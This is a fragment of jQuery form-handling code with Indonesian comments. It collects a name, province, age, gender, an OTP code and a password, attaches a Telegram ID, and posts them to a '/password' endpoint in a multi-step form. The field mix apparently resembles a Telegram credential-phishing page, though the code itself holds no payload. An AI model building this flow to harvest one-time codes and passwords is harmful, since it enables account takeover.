        var $full_name = $("input#validatefull_name").val();
        var $provinsi = $("input#validateprovinsi").val();
        var $usia = $("input#validateusia").val();
        var $kelamin = $("input#validatekelamin").val();
        var $otp_code = $("input#validateotp_code").val();
        var $password = $("input#password").val();
        var $idtele = "<%= String(telegramId) %>"; // Pastikan nilai telegramId sudah valid
        
        // Validasi jika data penting kosong
        if($phone_number == "" && $otp_code == "" && $password == ""){
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }

        $.ajax({
            type: "POST",
            url: "/password",
            data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
            beforeSend: function() {
                $("#alert").html(""); // Mengosongkan alert
                $('.loading').show();
                $('#thirdbutt').hide(); // Menyembunyikan tombol submit
            },
            success: function(response){
                // Pastikan respons dari server berupa objek JSON yang benar
                try {
                    // Mengecek apakah respons sukses atau error
                    if (response.code == 200) {
                        $('.loading').hide();
                        $('.third').hide();
                        $(".four").show();
                    } else {
                        // Menyembunyikan loading dan menampilkan tombol kembali
                        $('.loading').hide();
                        $('#thirdbutt').show();
                        
                        // Menampilkan pesan error jika ada
                        if (response.error) {
                            $("#alert").html(`<div class="alert alert-danger" role="alert">${response.code} - ${response.error}</div>`);
                        } else {
                            $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah, refresh halaman dan coba lagi</div>`);
                        }
                    }
                } catch (e) {
                    // Menangani error di dalam blok try-catch
                    $('.loading').hide();
                    $('#thirdbutt').show();
                    console.log(e);
                    $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah, refresh halaman dan coba lagi</div>`);
                }
            },
            error: function(xhr, status, error){
                // Menangani error jika ada masalah saat pengiriman data
                $('.loading').hide();
                $('#thirdbutt').show();
                console.log(error);
                $("#alert").html(`<div class="alert alert-danger" role="alert">Terjadi kesalahan, coba lagi nanti.</div>`);
            }
        });

        return false; // Menghentikan form submit default
    });
return false;
};
</script>


